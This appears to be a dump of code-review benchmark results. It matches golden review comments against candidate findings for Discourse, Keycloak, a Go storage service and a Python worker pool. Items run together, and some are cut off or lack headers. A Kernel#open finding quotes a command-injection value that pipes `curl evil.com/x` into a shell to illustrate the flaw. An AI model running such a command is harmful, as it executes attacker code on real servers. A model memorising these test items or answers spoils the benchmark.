FallbackLocaleList#[] crashes if SiteSetting.default_locale is nil

FallbackLocaleList#[] unconditionally calls SiteSetting.default_locale.to_sym and embeds the result in the fallback chain. If SiteSetting.default_locale is nil or an empty string (e.g. a half-applied migration, a misconfigured SiteSetting row, or a unit test that stubs the setting), this raises NoMethodError or returns [:en] without the site locale, silently degrading fallback behavior for every request that goes through the before_filter. FallbackLocaleList is a Hash subclass but only [] is overridden

FallbackLocaleList < Hash overrides [] to return an Array, but inherits Hash semantics for everything else (keys, each, merge, []=, store, dig, etc.) while the underlying hash stays empty. I18n::Backend::Fallbacks and other code may call e.g. I18n.fallbacks[locale] = [...] or iterate keys; those calls will silently no-op or return empty results, masking configuration mistakes. Additionally, since the override is not synchronized, two threads can compute the fallback list concurrently while reading SiteSetting.default_locale - benign today but a footgun if the override ever grows. `BlockedEmail.should_block?` queries with `BlockedEmail.where(email: email).first`, which is case-sensitive in MySQL/Postgres. Users signing up with any uppercase or mixed-case variation of a blocked address (e.g. `BAD@spamclub.com` when `bad@spamclub.com` is blocked) will not match the row and will be allowed to register. The blocker emails are stored verbatim by the migration/model and never normalized, so this completely defeats the anti-spam purpose of the new feature. Normalize on insert and/or on lookup (e.g. `Email.downcase` to match how `users_controller#change_email` already normalizes), or store a separate `email_lower` column and index it.
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same vulnerability: the email lookup in `BlockedEmail.should_block?` is case-sensitive, allowing users to bypass the block by using uppercase or mixed-case variations of a blocked email address.

false_positives.candidate:
No test verifies case-insensitive blocking

All examples use the same string literal for the blocked record and the queried email. The bypass described in the `blocked_email.rb` finding (typing `BAD@spamclub.com` against a blocked `bad@spamclub.com`) is the most important scenario the new feature is supposed to prevent and it is not covered. Add a context where the queried email differs in case from the stored `blocked_email.email` and assert `should_block?` still returns true (and updates the counter).

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
Invalid CSS property -ms-align-items in align-items mixin

The new align-items mixin emits `-ms-align-items: $alignment;`. The IE 10 prefix for align-items is `-ms-flex-align` (already included on line 120); `-ms-align-items` is not a real CSS property. The redundant invalid declaration is silently ignored by browsers and is a typo. The correct line should be removed.
true_positives.reasoning: The candidate issue identifies the exact same problem as the golden comment: that `-ms-align-items` is not a valid CSS property and that `-ms-flex-align` is the correct legacy IE property.

false_positives.candidate:
Invalid CSS property -webkit-align-items in align-items mixin

The new align-items mixin emits `-webkit-align-items: $alignment;`. WebKit/Blink never shipped this property — they used `-webkit-box-align` for the 2009 spec (already included on line 118) and then went straight to the unprefixed `align-items`. The `-webkit-align-items` declaration is not a recognized CSS property; browsers will discard it silently. It clutters the compiled output and is a clear typo adjacent to the correct `-webkit-box-align` line.

Invalid CSS property -webkit-order in order mixin

The new order mixin emits `-webkit-order: $val;`. WebKit/Blink never shipped this property — they used `-webkit-box-ordinal-group` for the 2009 spec (already included on line 126) and then went straight to the unprefixed `order`. `-webkit-order` is not a valid CSS property and is silently ignored. This is a typo adjacent to the correct `-webkit-box-ordinal-group` line.

Removed bullet badge vertical alignment without replacement

The diff deletes the rule `.extra-info-wrapper .badge-wrapper { float: left; &.bullet { margin-top: 5px; } }` and replaces it with `float: left` only, while also adding `@include order(2)` to the wrapper. The previous `margin-top: 5px` on bullet-style badges was used to vertically align the colored bullet with adjacent baseline-aligned text (a typical alignment fix for inline elements used inside a larger line of text). Nothing in this PR provides an equivalent offset, so bullet-style category badges rendered inside `.extra-info-wrapper` (e.g., on topic lists and the topic page header) may now sit visually lower than the surrounding text. This is a regression with no test or visual reference provided.

Large padding reduction on .small-action-desc is untested

`.small-action-desc` padding was changed from `0.5em 0 0.5em 4em` (with a matching `margin-top: 5px`) to `padding: 0 1.5%` while `.small-action` is converted to a flex container. The original 4em left padding was sized to clear the `.topic-avatar` icon column in the float-based layout. In the new flex layout the avatar becomes a sibling flex item, but the new `padding: 0 1.5%` collapses the inner `.avatar`'s surrounding space to a tiny percentage with no minimum, and the old `margin-top: 5px` was dropped without a replacement. Combined with the removal of `padding-top: 4px` on `> p`, the description block is likely to render noticeably tighter and/or vertically misaligned versus the avatar column. No screenshot, test, or visual regression coverage accompanies this change.

Complete removal of .title rule while relying on flex container

The diff deletes the entire `.title { float: left; }` rule and turns `.contents` into a flex container. While removing the float is intentional, the rule is now gone entirely — any other declaration (e.g., `min-width`, `max-width`, `flex` shrink behavior, `white-space`) that downstream consumers might have relied on for the title element is no longer being applied here. In addition, the fallbacks produced by the new `flexbox()` mixin (`-webkit-box`, `-moz-box`) make `.contents` a 2009-spec box container in legacy browsers, where `.title` and `.panel` will not behave like modern flex items; without the removed float, the layout in those legacy engines has no clear-float behavior. The change should at minimum be verified visually in a legacy-WebKit/Firefox fallback.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name missing ? suffix breaks AMS include check

The new `def include_website_name` method at line 153 is missing the `?` suffix: it should be `def include_website_name?`. ActiveModel Serializers discovers conditional include logic by looking for predicate methods named `include_<attr>?` on the serializer. Without the `?`, this method is not recognized as an include check, and `website_name` will be included in the serialized JSON whenever the attribute method exists, regardless of whether `website` is set. This contradicts the design intent shown by the body `website.present?` and is inconsistent with every other `include_*?` method in the same file (e.g., `include_email?` at line 117, `include_stats?`, `include_suspend_reason?`, `include_user_fields?`, `include_topic_post_count?`), all of which correctly use the predicate form. Fixing this is a one-character change (`def include_website_name?`) and matches the established convention in the file.
true_positives.reasoning: The candidate issue accurately identifies the main bug described in the golden comment: the `include_website_name` method is missing the `?` suffix required by Rails/ActiveModel Serializers for conditional attribute inclusion. Although the golden comment also mentions a secondary issue regarding string literal mutation (`'.' << website_host`), the candidate clearly matches the primary underlying issue.

false_positives.candidate:
Missing test for same-segment-count subdomain (elsif) branch

The `website_name` method has three branches: (1) exact host match `if website_host == discourse_host`, (2) same-segment-count subdomain match `elsif (website_host.split('.').length == discourse_host.split('.').length) && discourse_host.split('.').length > 2`, and (3) parent-domain match `else`. The three tests added in this PR only cover branches (1) and (3); the elsif branch (the `www.example.com == forum.example.com` case) is not exercised at all. That branch contains the most complex logic in the method — `website_host.split('.')[1..-1].join('.') == discourse_host.split('.')[1..-1].join('.') ? website_host + URI(website.to_s).path : website_host` — and has both a true and false outcome that should be verified, e.g., `Discourse.current_hostname = 'forum.example.com'` with website `http://www.example.com/user` (should yield `www.example.com/user`) and with website `http://www.other.com/user` (should yield `www.other.com`, no path).

Missing edge case tests for URL parsing in website_name

The new `website_name` method uses `URI(website.to_s).host` (with `rescue nil`) and `URI(website.to_s).path`, which behave inconsistently at the boundary. No tests cover: (1) a malformed URL such as `'not a valid url'` where `URI(...).host` raises (handled by `rescue nil`), (2) a URL with no path such as `http://example.com` where `URI().path` is `''`, producing `'example.com'`, or (3) a URL with a trailing slash such as `http://example.com/` where `URI().path` is `'/'`, producing `'example.com/'`. The trailing-slash inconsistency in particular means two visually identical URLs (one with, one without `/`) render different display text on the profile, which would surprise users and is worth either a test or explicit normalization in the serializer.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on user-controlled URL allows command execution

`rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` invokes `Kernel#open` on the configured feed URL. Ruby's `Kernel.open` treats a leading `|` as a subshell command, so an admin who pastes or copy-pastes a URL like `|curl evil.com/x | sh` (or `|something`) into `feed_polling_url` will execute it as the Ruby process (which is the Rails/web process — typically the Discourse user, often with access to the DB and `Rails.env` secrets). Later versions of Discourse explicitly replace `Kernel.open` and `OpenURI.open_uri` everywhere this pattern appears for exactly this reason. Use `URI.open(SiteSetting.feed_polling_url)` (OpenURI) or an explicit HTTP client, with a redirect/host allowlist and size/time limits, instead of `Kernel.open`.
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same vulnerable line of code (`open(SiteSetting.feed_polling_url)`) and the lack of validation on the user-controlled `feed_polling_url`. While the candidate focuses primarily on the RCE aspect of Ruby's `Kernel#open` and the golden comment focuses on SSRF, the candidate also explicitly recommends adding a host/redirect allowlist and using a proper HTTP client, covering the SSRF remediation as well. They point to the same underlying security flaw.

true_positives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.
true_positives.matched_candidate:
postMessage targetOrigin should be origin only, not referer URL

The `postMessage` call uses `'<%= request.referer %>'` as the `targetOrigin` argument. `targetOrigin` should be a serialized origin (scheme + host + port) or `*`. Passing the full referer URL works in browsers because they parse the string down to its origin, but the correct and safe value is explicitly the origin. Worse, when `request.referer` is nil/empty (which `ensure_embeddable` allows when there is no Referer header), the rendered value becomes `parent.postMessage(..., '')`. An empty string is treated as `"*"` by browsers, causing the resize message to be sent to any window that has registered a `message` listener — a small but real information leak (the Discourse iframe's pixel height to any opener/parent). Render the referer's origin (e.g. `"#{URI(request.referer || '').scheme}://#{URI(request.referer || '').host}"`) and bail out (or send `null` height) when referer is missing.
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same core problem: `postMessage`'s `targetOrigin` parameter is being passed the full `request.referer` URL instead of just the origin (scheme + host + port).

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
i.content may be nil and blows up on .scrub

`content = CGI.unescapeHTML(i.content.scrub)` assumes `i.content` is non-nil. Not every RSS/Atom item carries a `content` field — some provide only `description` or `summary`, in which case `SimpleRSS#content` returns `nil` and `nil.scrub` raises `NoMethodError`. A single malformed feed entry aborts the entire hourly poll job for the rest of the items in the batch and may surface in error reports. Use `i.content.presence || i.description.to_s` (or wrap in a guard) so missing content yields an empty string instead of an exception.
true_positives.reasoning: The candidate issue accurately identifies the exact same bug as the golden comment: calling `i.content.scrub` when `i.content` is nil (because RSS feeds often only provide a `description`), which causes a crash, and suggests falling back to `description`.

false_positives.candidate:
raw_html cook_method bypasses sanitization, enabling stored XSS

In `Post#cook`, when `cook_method == Post.cook_methods[:raw_html]` the method returns `raw` verbatim, skipping `post_analyzer.cook(*args)` which is what normally runs sanitization (whitelisted image classes, host-aware link rewriting, etc.). The `TopicEmbed.import` flow (called from `TopicEmbed.import_remote` → `ruby-readability`, and from `Jobs::PollFeed` over fetched RSS items) creates these posts with `cook_method: Post.cook_methods[:raw_html]` and stores the upstream raw HTML as `raw`. Any HTML/JS present in the trusted-but-compromised source (a hijacked blog post, a malicious RSS entry, etc.) is therefore rendered to every visitor of the embed iframe, and because `best.html.erb` renders with `<%= raw post.cook %>`, nothing in the rendering path will scrub it. This is stored XSS inside the Discourse origin. At minimum, the `raw_html` branch must run the same sanitizer `cook` applies for regular posts (e.g. `PostAnalyzer.new(raw, topic_id).cook`), or, better, the cook_method selector should reject generic HTML and only accept a constrained subset.

Script throws if #discourse-comments is not present

`var comments = document.getElementById('discourse-comments')` is dereferenced at `comments.appendChild(iframe)` without a null check. If a third-party site embeds the script before the `#discourse-comments` div exists (wrong placement, dynamic page where the div hasn't been rendered yet, etc.), the script crashes on the `null.appendChild(...)` call and the rest of the IIFE — including the `postMessage` listener — never runs, so the embed silently fails and the iframe can never self-resize. Guard the append: `if (comments) { comments.appendChild(iframe); } else { document.body.appendChild(iframe); }`.

absolutize_urls corrupts protocol-relative URLs

`absolutize_urls` only absolutizes `href`/`src` values that `start_with?('/')`. Protocol-relative URLs like `//cdn.example.com/img.jpg` match that check but then `href.sub(/^\/+/, '')` strips every leading slash, so a value that is supposed to point at `https://cdn.example.com/img.jpg` is rewritten into `https://example.comcdn.example.com/img.jpg`. The link appears to be a same-origin resource, which is both broken (the image fails to load) and a small URL-confusion issue because the rendered URL points at the embed host. Detect protocol-relative inputs explicitly: `a['href'] = href.sub(/^\/+/, '/') if href.start_with?('//')` (keep the leading `//`) and append to `prefix` instead of inserting a literal slash.

TTL is set only on the racing process; throttle window is effectively unbounded

`retrieved_recently?` uses `SETNX` followed by `EXPIRE 60`. Between the `SETNX` and the `EXPIRE`, the key has no TTL — if the process dies in that gap (Sidekiq worker killed, VM paused) the key persists forever with the value `"1"`, and every subsequent attempt to retrieve that same embed URL will be silently throttled indefinitely because `invalid_host?` is the only other gate and the throttle check returns `true` first. Move the TTL into a single atomic call: `$redis.set(retrieved_key, '1', nx: true, ex: 60)` so the key is always created with its expiration. Additionally, the inverse race exists: two workers can both pass `retrieved_recently?` returning false simultaneously before either `SETNX` runs, and both will go on to call `TopicEmbed.import_remote` — the unique index on `topic_embeds.embed_url` is the only thing protecting against the double-import, and `TopicEmbed.import` calls `PostCreator.create` with side effects (notifications, draft sequence, message_bus publish) that aren't rolled back by the unique-index failure. These two issues combined mean the throttle provides at most a 60-second fence, not a deduplication guarantee, despite the name.

perform_retrieve runs the entire RSS poll synchronously inside a single embed import

`TopicRetriever#perform_retrieve` does `Jobs::PollFeed.new.execute({})` whenever feed polling is enabled. That job imports every item in the entire RSS feed in a single call — fetching and cooking N remote pages even when this retriever only cares about one specific `embed_url`. For a feed with dozens of entries the embedding request stalls for minutes, blocking the Sidekiq worker, and on every cached re-fetch the whole feed is re-iterated. Filter inside `poll_feed` (or split it into two methods, one keyed by URL) so the synchronous embed path only fetches the requested entry.

Stale/unrelated require_dependency 'email/sender'

`require_dependency 'email/sender'` is added at the top of the RetrieveTopic job but the job does not use the `Email::Sender` class (or anything else from the email stack) anywhere in this file. It appears to be a copy/paste leftover from another job. Keeping it loads the email autoload subtree unnecessarily on every Sidekiq run of this class and confuses readers searching for the dependency chain.

false_negatives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.
The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Duplicate `def self.downsize` method shadows the original

The file ends up with two `def self.downsize` definitions: lines 145–147 keep the 4-arg form `downsize(from, to, max_width, max_height, opts={})`, and lines 149–151 add a new 3-arg form `downsize(from, to, dimensions, opts={})`. Ruby silently redefines the method, so the second definition wins and any caller using `OptimizedImage.downsize(path, path, width, height)` (the previous public arity) will now raise ArgumentError because the surviving method only accepts three positional arguments. The old definition should have been removed when the new one was added.
true_positives.reasoning: Both the golden comment and the candidate issue identify the exact same bug: `downsize` is defined twice, causing the second definition (taking `dimensions`) to override/shadow the first definition (taking `max_width` and `max_height`), which makes the original method unreachable and breaks callers using the previous argument signature.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client-side upload limit hardcoded to 10 MB, ignoring per-type site setting

The previous code used `Discourse.SiteSettings['max_' + type + '_size_kb']`, which honored `max_image_size_kb` for images and `max_attachment_size_kb` for attachments. The new code hardcodes `10 * 1024` for every type. This breaks attachment uploads (which have no downsizing fallback server-side) when `max_attachment_size_kb` is below 10 MB, and it can also let through files that the server rejects if `max_image_size_kb` is set below 10 MB. The change is unrelated to the image-downsizing feature and should use the per-type site setting like before.
true_positives.reasoning: The candidate issue accurately identifies the exact same bug as the golden comment: hardcoding `maxSizeKB` to `10 * 1024` instead of using `Discourse.SiteSettings['max_' + type + '_size_kb']`, which causes the client-side limit to ignore per-type site settings and diverge from server-side limits.

false_positives.candidate:
413 error message always reports 10 MB regardless of configured limit

The handler for HTTP 413 now reports `max_size_kb: 10 * 1024` even though the server-side limit comes from `SiteSetting.max_image_size_kb`. Users told they exceeded a 10 MB limit will be confused when the actual configured limit is something else (e.g. 1 MB), and the value rendered in the alert no longer reflects the server-side limit that triggered the rejection. The previous `Discourse.SiteSettings.max_image_size_kb` value should be preserved here.

URL download cap raised to a hardcoded 10 MB, ignoring site setting

`FileHelper.download(url, SiteSetting.max_image_size_kb.kilobytes, ...)` was replaced with `FileHelper.download(url, 10.megabytes, ...)`. The cap no longer honors `max_image_size_kb` and is now a fixed 10 MB regardless of what the administrator configured. For sites with a small `max_image_size_kb` this lets callers pull arbitrarily large files into a temp file (only to be downsized afterwards), increasing disk usage and memory pressure. The new 10 MB cap should at minimum remain consistent with `max_image_size_kb` and ideally be configurable.

Downsize loop discards `OptimizedImage.downsize` return value

`OptimizedImage.downsize` can return `false` when ImageMagick fails (e.g. corrupt or unsupported image, even though `FileHelper.is_image?` returned true). The controller ignores the return value, so the loop just decrements `attempt` and keeps going even though the file size never shrinks. There is no logging and no signal to the rest of the flow. The return value should be checked and the failure logged (and ideally surfaced to the user) instead of being silently dropped.

Oversized upload proceeds silently after 5 downsize attempts

If the file is still larger than `SiteSetting.max_image_size_kb.kilobytes` after the 5-iteration downsize loop completes, the controller falls through and calls `Upload.create_for` with the still-oversized `tempfile`. There is no error returned, no log entry, and no user-visible message, so a user who uploaded an image expecting it to be resized will get a rejected/oversized upload without explanation. The loop should break out with an explicit error (logged and returned in the response) when downsizing cannot get the file under the configured limit.

false_negatives.golden_comment: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash

NoMethodError when the user has no TopicUser row for the topic

`tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` (line 105) returns nil for any user who has never opened the topic but is still on the recipient list of the notification email (the common case for someone clicking 'unsubscribe' from an email). true_positives.golden_comment: Typo in property name: 'stopNotificiationsText' should be 'stopNotificationsText' (missing 'n' in 'Notifications')
true_positives.matched_candidate:
Typo in computed property: stopNotificiationsText

The computed property is named `stopNotificiationsText` (N-o-t-i-f-i-c-a-t-i-o-n-s, three i's) and the same misspelling is used in `templates/topic/unsubscribe.hbs` line 3. false_positives.candidate:
Unsubscribe is a state-changing GET that also returns the full topic page

The new unsubscribe action is reached only via GET routes (config/routes.rb lines 440-441), yet it both mutates user state (`tu.save!` at line 113) and returns the rendered topic view (`perform_show_response` at line 115). GET requests must be idempotent. The unsubscribe URL is embedded in every notification email (app/mailers/user_notifications.rb line 295, config/locales/server.en.yml), and link-previewers, antivirus scanners, corporate proxies, and prefetching mail clients routinely fetch URLs found in emails. Each prefetch will silently toggle the user's notification level between regular and muted. There is no CSRF token (and none can be on a GET), so there is also no defence against any cross-site request that triggers navigation to the URL. The expected UX for an unsubscribe click is a short confirmation / re-subscribe page, not the entire topic with all posts; as shipped, the response is the wrong page and the action is unsafe to expose as a GET.

Unsubscribe action has no authorization check on the topic

After `@topic_view = TopicView.new(...)` the action immediately looks up the user's TopicUser row (line 105), mutates it (line 108-111) and saves it (line 113) without ever calling `guardian.ensure_can_see!(@topic_view.topic)` (compare with `mute`, `re_pin`, `clear_pin`, etc. in the same controller which all do call `ensure_can_see!`). Any logged-in user who knows or guesses a topic id can visit `/t/<slug>/<id>/unsubscribe` and silently unsubscribe from any topic, including topics in read-restricted categories or topics they have been removed from. Because the action then calls `perform_show_response`, the rendered response can also expose topic content the user is not authorised to see when `TopicView.new` does not raise (e.g. a topic in a category the user still has limited access to).

Server renders topics/show instead of the unsubscribe confirmation page

After saving the new notification level, `perform_show_response` (line 115) renders `topics/show`, i.e. the full topic view including all posts, breadcrumbs, reply controls, etc. The PR also adds a complete client-side unsubscribe experience (`controllers/topic-unsubscribe.js.es6`, `routes/topic-unsubscribe.js.es6`, `templates/topic/unsubscribe.hbs`, `views/topic-unsubscribe.js.es6`, the new `.topic-unsubscribe` SCSS block, and the `topic.unsubscribe.stop_notifications` / `change_notification_state` i18n strings), but the server pre-empts all of it by rendering the show template. The new Ember route, controller, view, template, styles, and locale strings are unreachable through the URL the email links to. The action should either render an unsubscribe-specific server template (`render :unsubscribe`) or redirect (e.g. 302 to `topic.relative_url`) so the user lands on a confirmation / change-notification-state page rather than the topic itself.

No assertion that the per-topic unsubscribe URL reaches the email body

Federated recovery codes can be reused indefinitely

The new `isValid` implementation for `RecoveryAuthnCodesCredentialModel.TYPE` only checks whether the supplied input matches any of the originally generated codes in `getCredentialData()`, but never updates the credential data or any other state to mark a code as consumed. As a result, once a recovery code is written into the federated store it can be submitted over and over and `isValid` will keep returning `true`. Recovery codes must be single-use; the local `RecoveryAuthnCodesCredentialProvider` mutates its credential data on each successful `isValid` call, so the contract that the federated provider now implements must do the same (e.g. by calling `updateCredential` to remove the consumed code). Without this, the feature quietly downgrades from one-time codes to reusable passwords for any user coming from a federated storage that adopts this PR.

Federated recovery-code model never reports `allCodesUsed()`

`getCredentials` reconstructs the `RecoveryAuthnCodesCredentialModel` via `RecoveryAuthnCodesCredentialModel.createFromValues(...)` from the full original code list stored in `credentialData`, and it never updates `credentialData` after `isValid` succeeds (see the other finding). Because the storage doesn't track consumption, `recoveryCodeCredentialModel.allCodesUsed()` in `RecoveryAuthnCodesFormAuthenticator` will always be `false` for federated users, so the credential is never removed and the `CONFIGURE_RECOVERY_AUTHN_CODES` required action is never added even after the user has burned through every code. The credential data must be mutated on each successful validation (consumed code removed) for `allCodesUsed()` and the single-use semantics to work.

Federated recovery codes cannot be removed after use

After a successful verification, the authenticator calls `authenticatedUser.credentialManager().removeStoredCredentialById(recoveryCodeCredentialModel.getId())` whenever `allCodesUsed()` returns true. `removeStoredCredentialById` only operates on local (Keycloak DB) credentials. With this PR, `RecoveryAuthnCodesUtils.getCredential(...)` now returns federated credentials as well, so when the federated store reports all codes consumed the call silently does nothing and the user is left with an empty/unusable credential. The code needs to use the credential-manager path appropriate for federated credentials (e.g. `removeCredential` / delegating to the user-storage provider), or branch on whether the credential is federated vs. stored.

`createRecoveryCodesCredential` checks the boolean returned by `user.credentialManager().updateCredential(...)` but discards the result of `recoveryCodeCredentialProvider.createCredential(realm, user, credentialModel)`. If local creation fails (e.g. DB constraint violation, provider exception), the method returns normally and the caller in `RecoveryAuthnCodesAction.processAction` then calls `reqActionContext.success()` even though no credential was actually stored. Either propagate the failure (throw, or return a boolean) or at minimum log an error; `createOTPCredential` directly above for comparison returns a boolean for the same reason.

Recovery-codes test never asserts codes are single-use

`testRecoveryKeysSetupAndLogin` only exercises a successful login with the first requested code. It does not (a) verify the same code cannot be reused on a second login, (b) verify that `allCodesUsed()` flips after consuming every code, (c) verify that the credential is removed from user storage once exhausted, or (d) verify that `CONFIGURE_RECOVERY_AUTHN_CODES` becomes a required action afterwards. Given the federated-storage bugs reported above (no consumption tracking, `removeStoredCredentialById` is wrong API, id mismatch), these are exactly the cases that would catch them. The test currently passes only because it never asks the user-storage provider to mutate state.

`getCredential` shadows a different lookup semantic from the old call site

`getCredential` returns the first federated credential that matches the type, with no fallback if a local credential also exists. In the (admittedly rare) situation where both a federated and a local `recovery-authn-codes` credential coexist for the same user, the local one is silently ignored. This is a behaviour change vs. the previous code in `RecoveryAuthnCodesFormAuthenticator` and `RecoveryAuthnCodeInputLoginBean`, which only ever looked at local storage. Worth either documenting the precedence rule explicitly in the javadoc or merging both sources with a deterministic ordering.

false_positives.candidate:
Watch goroutine never exits after backend channel close

In search.init(), the watch goroutine uses `for { v := <-events; s.handleEvent(watchctx, v) }`. When the storage backend stops (e.g., via sql backend's `defer close(stream)` after `b.done` triggers), the channel is closed and `<-events` returns the zero value (a nil *WrittenEvent) forever. handleEvent then hits the `!slices.Contains(...)` branch and logs `ignoring watch event type 0` on every iteration, leading to unbounded log spam and a leaked goroutine for the lifetime of the process. The loop should be `for v := range events` (which exits when the channel closes) or use a `select` on a done channel. Combined with `watchctx := context.Background()` (which never cancels), there is no way to stop this goroutine. The PR's introduction of eager Init makes this more likely to be exercised during normal shutdown.

The PR description states 'Fixes trace propagation by passing span contexts down', but the long-running watch goroutine spawned in search.init() still uses `watchctx := context.Background()` (note the `// new context?` comment, suggesting this was intentionally left undone). The init() and build() functions now correctly propagate the new ctx via `ctx, span := s.tracer.Start(ctx, ...)`, but the watch loop and everything downstream of it (all handleEvent invocations) lose the trace context. Either fix this to use the parent ctx for trace propagation, or document in the commit message why watch events are intentionally not traced.

NewResourceServer now blocks on initialization, behavior change

NewResourceServer now synchronously calls `s.Init(ctx)` before returning, which performs lifecycle init, builds the entire search index across all namespaces, and starts the watch loop. Previously this was deferred to the first gRPC call. Callers that constructed the server (e.g., tests, alternate wiring code) expecting non-blocking construction, or that supplied their own timeout for init, will now block indefinitely on a potentially expensive operation with no timeout context. The PR description asks 'Does anything else depend on initializing US lazily? What could this break?' but no callers were audited in the diff. At minimum, the timeout/context contract of NewResourceServer has changed and any test or production path that wanted to construct a server without paying the init cost will be affected.

Search watch goroutine is leaked on partial init failure

Init now runs: lifecycle.Init -> search.init -> initWatcher. search.init spawns the long-running watch goroutine (the one with the closed-channel bug above). If search.init succeeds but initWatcher then fails (returning the error from NewResourceServer), the watch goroutine is never torn down and the server is returned as nil to the caller, so nothing in the caller path can cancel it. There is no rollback or cleanup if a later init step fails after an earlier one has started goroutines. This needs either an explicit cleanup step or defer-with-undo pattern to release resources on partial init failure.

BuildIndex span context is not propagated, inconsistent with other trace fixes

The PR changes `_, span := ...Start(ctx, ...)` to `ctx, span := ...Start(ctx, ...)` in search.init, search.build, and sql.GetResourceStats to propagate the new ctx to downstream calls. bleve.BuildIndex still has `_, span := b.tracer.Start(ctx, tracingPrexfixBleve+"BuildIndex")` and never reassigns ctx, so the new ctx (with the span) is discarded. This is inconsistent with the stated goal of fixing trace propagation. Either change this to `ctx, span := ...` for consistency, or note that BuildIndex has no child spans (and the discrepancy is intentional). Note also that the surrounding `_, err := index.NewBatch()`-style code creates side effects (a batch is opened); if any future code adds tracing to those paths it would silently miss the parent context.

Stop writes s.initErr without synchronization

Stop assigns `s.initErr = fmt.Errorf("service is stopping")` outside of any mutex or sync.Once, while Init reads it under once.Do. After the PR, in practice the calls don't overlap (Init runs synchronously inside NewResourceServer and returns before Stop is reachable), but the field is still shared mutable state guarded only by `s.once` for reads in Init. A future change that calls Init externally (the once.Do machinery is still there, suggesting that was the intent) would race with Stop. Consider removing the s.initErr mutations in Stop entirely or guarding the field with a mutex.

Postgres skip is a workaround, not a fix

The diff adds `if dbType == "postgres" { t.Skip(...) }` with a TODO, but this PR directly changes the unified storage init path that the test exercises (the test boots the storage server target, which now eagerly calls Init inside NewResourceServer). The exact reason the test fails on postgres is unknown and unfixed, and the new init-at-startup behavior is not validated against postgres. The PR's main goal (fixing context-cancelled errors from lazy init) should be covered by a test that exercises the storage server target under at least one DB, not just mysql.

Either pass `maxsize` to `queue.Queue(maxsize=...)` to actually provide backpressure, or correct the docstring.

Worker shutdown flag is a non-atomic bool

`OrderedQueueWorker.shutdown` is a plain `bool` attribute written by the main thread (in `FixedQueuePool.shutdown`) and read by the worker thread. While CPython's GIL makes this safe in practice, it is not portable and is not thread-safe by Python's memory model. Use `threading.Event` (`self._stop_event`) and `self._stop_event.is_set()` instead, matching the pattern already used by `SimpleQueueProcessingStrategy.shutdown_event`.

num_queues is not validated

`FixedQueuePool.__init__` accepts `num_queues: int = 20` without checking it is positive. If a caller (or the new `thread-queue-parallel` mode) passes `max_workers=0` or a negative value, the loop creates no queues/workers, and the first call to `submit` raises `IndexError` from `self.queues[queue_index]` deep in `FixedQueuePool.submit`. Validate `num_queues >= 1` (and ideally a sensible upper bound) at construction time so misconfiguration fails loudly and early.

Offset tracker scans full range per partition every second

`OffsetTracker.get_committable_offsets` is called once per second from `_commit_loop` and, for each partition, computes `min(all_offsets)` and `max(all_offsets)` and then iterates the full range `range(start, max_offset + 1)`. With a partition that has, say, 10k outstanding offsets, every commit tick performs O(10k) set lookups plus two O(n) set scans. For a backlog scenario this is O(n) per second per partition. Track `min_offset` and `max_offset` incrementally (e.g. on `add_offset`) and stop as soon as the first gap is hit instead of recomputing the extremes every call.

Worker thread can die silently on unexpected get() error

`OrderedQueueWorker.run` only catches `queue.ShutDown` around `self.work_queue.get()`. Any other exception raised by `get()` (e.g. an OS-level error, a future Python version change) propagates out of `run()` and kills the daemon thread silently — items remaining in that queue will never be processed and their offsets will never be marked complete, permanently blocking that partition's commits. Wrap the call in a broader `except Exception` that logs and either retries or exits cleanly, and consider asserting the worker is still alive from a supervisor.

Integration test relies on arroyo private internals

